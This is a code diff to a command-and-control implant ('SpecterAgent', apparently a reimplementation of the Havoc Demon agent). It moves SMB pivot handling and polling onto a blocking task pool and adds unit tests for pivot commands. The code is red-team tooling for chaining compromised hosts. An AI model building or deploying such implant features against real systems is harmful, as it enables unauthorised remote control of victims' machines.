@@ -2,6 +2,7 @@
 
 use red_cell_common::crypto::{ctr_blocks_for_len, decrypt_agent_data_at_offset};
 use red_cell_common::demon::{DemonCommand, DemonMessage};
+use tokio::task;
 use tracing::{info, warn};
 
 use crate::dispatch::{self, DispatchResult, Response};
@@ -122,16 +123,29 @@ impl SpecterAgent {
                 // CommandPivot manages SMB pipe state — handle it directly so
                 // the PivotState can track connections and poll them later.
                 if package.command_id == u32::from(DemonCommand::CommandPivot) {
-                    if let Some(resp) = self.pivot_state.handle_command(&package.payload) {
-                        let rid =
-                            if resp.request_id != 0 { resp.request_id } else { package.request_id };
-                        if let Err(e) =
-                            self.send_callback_raw(resp.command_id, rid, &resp.payload).await
-                        {
+                    match self.handle_pivot_command(&package.payload).await {
+                        Ok(Some(resp)) => {
+                            let rid = if resp.request_id != 0 {
+                                resp.request_id
+                            } else {
+                                package.request_id
+                            };
+                            if let Err(e) =
+                                self.send_callback_raw(resp.command_id, rid, &resp.payload).await
+                            {
+                                warn!(
+                                    agent_id = format_args!("0x{:08X}", self.agent_id),
+                                    error = %e,
+                                    "failed to send pivot response"
+                                );
+                            }
+                        }
+                        Ok(None) => {}
+                        Err(e) => {
                             warn!(
                                 agent_id = format_args!("0x{:08X}", self.agent_id),
                                 error = %e,
-                                "failed to send pivot response"
+                                "pivot command failed"
                             );
                         }
                     }
@@ -182,7 +196,13 @@ impl SpecterAgent {
             // Poll connected SMB pivots for child agent responses (mirrors
             // Demon's PivotPush).
             if self.pivot_state.has_active_pivots() {
-                self.pivot_state.poll();
+                if let Err(e) = self.poll_pivots().await {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        error = %e,
+                        "pivot poll failed"
+                    );
+                }
             }
 
             // Send any pending pivot responses back to the teamserver.
@@ -335,6 +355,35 @@ impl SpecterAgent {
         base.saturating_sub(jitter_range).saturating_add(jitter)
     }
 
+    async fn handle_pivot_command(
+        &mut self,
+        payload: &[u8],
+    ) -> Result<Option<Response>, SpecterError> {
+        let payload = payload.to_vec();
+        let pivot_state = std::mem::take(&mut self.pivot_state);
+        let (pivot_state, response) = task::spawn_blocking(move || {
+            let mut pivot_state = pivot_state;
+            let response = pivot_state.handle_command(&payload);
+            (pivot_state, response)
+        })
+        .await
+        .map_err(|e| SpecterError::Transport(format!("pivot command task failed: {e}")))?;
+        self.pivot_state = pivot_state;
+        Ok(response)
+    }
+
+    async fn poll_pivots(&mut self) -> Result<(), SpecterError> {
+        let pivot_state = std::mem::take(&mut self.pivot_state);
+        self.pivot_state = task::spawn_blocking(move || {
+            let mut pivot_state = pivot_state;
+            pivot_state.poll();
+            pivot_state
+        })
+        .await
+        .map_err(|e| SpecterError::Transport(format!("pivot poll task failed: {e}")))?;
+        Ok(())
+    }
+
     async fn send_callback(
         &mut self,
         command: DemonCommand,
@@ -407,7 +456,7 @@ impl SpecterAgent {
 mod tests {
     use super::*;
     use crate::config::SpecterConfig;
-    use red_cell_common::demon::DemonPackage;
+    use red_cell_common::demon::{DemonPackage, DemonPivotCommand};
 
     #[test]
     fn compute_sleep_delay_no_jitter() {
@@ -489,6 +538,53 @@ mod tests {
             agent.ctr_offset() > start_offset,
             "CTR offset must advance after decrypting job payloads"
         );
+    }
+
+    #[tokio::test]
+    async fn handle_pivot_command_runs_on_blocking_pool() {
+        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
+        let payload = u32::from(DemonPivotCommand::List).to_le_bytes();
+
+        let response = agent.handle_pivot_command(&payload).await.expect("pivot response");
+        let response = response.expect("list response");
+
+        assert_eq!(response.command_id, u32::from(DemonCommand::CommandPivot));
+        assert_eq!(
+            u32::from_le_bytes(response.payload[..4].try_into().expect("subcommand")),
+            u32::from(DemonPivotCommand::List)
+        );
+    }
+
+    #[tokio::test]
+    async fn handle_pivot_command_returns_non_windows_connect_error() {
+        if cfg!(windows) {
+            return;
+        }
+
+        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
+        let pipe = r"\\.\pipe\test";
+        let pipe_utf16: Vec<u8> = pipe
+            .encode_utf16()
+            .chain(std::iter::once(0u16))
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbConnect).to_le_bytes());
+        payload.extend_from_slice(&(pipe_utf16.len() as u32).to_le_bytes());
+        payload.extend_from_slice(&pipe_utf16);
+
+        let response = agent.handle_pivot_command(&payload).await.expect("pivot response");
+        let response = response.expect("error response");
+
+        assert_eq!(u32::from_le_bytes(response.payload[4..8].try_into().expect("success flag")), 0);
+    }
+
+    #[tokio::test]
+    async fn poll_pivots_runs_on_blocking_pool() {
+        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
+        agent.poll_pivots().await.expect("pivot poll");
+        assert!(!agent.pivot_state.has_active_pivots());
     }
 
     // ── Kill-date tests ─────────────────────────────────────────────────────
